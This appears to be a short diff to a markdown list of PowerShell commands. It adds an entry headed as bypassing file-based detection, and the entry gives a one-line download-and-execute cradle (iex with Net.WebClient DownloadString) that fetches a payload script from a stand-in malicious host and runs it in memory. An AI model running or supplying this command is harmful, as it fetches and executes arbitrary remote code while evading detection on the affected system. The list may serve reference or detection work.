@@ -73,3 +73,6 @@
 `Start-Sleep -Seconds 10`
 
 ---
+
+## Bypasses file-based detection and executes malicious code directly in memory
+`iex((New-Object Net.WebClient).DownloadString('https://malware.com/payload.ps1'))`
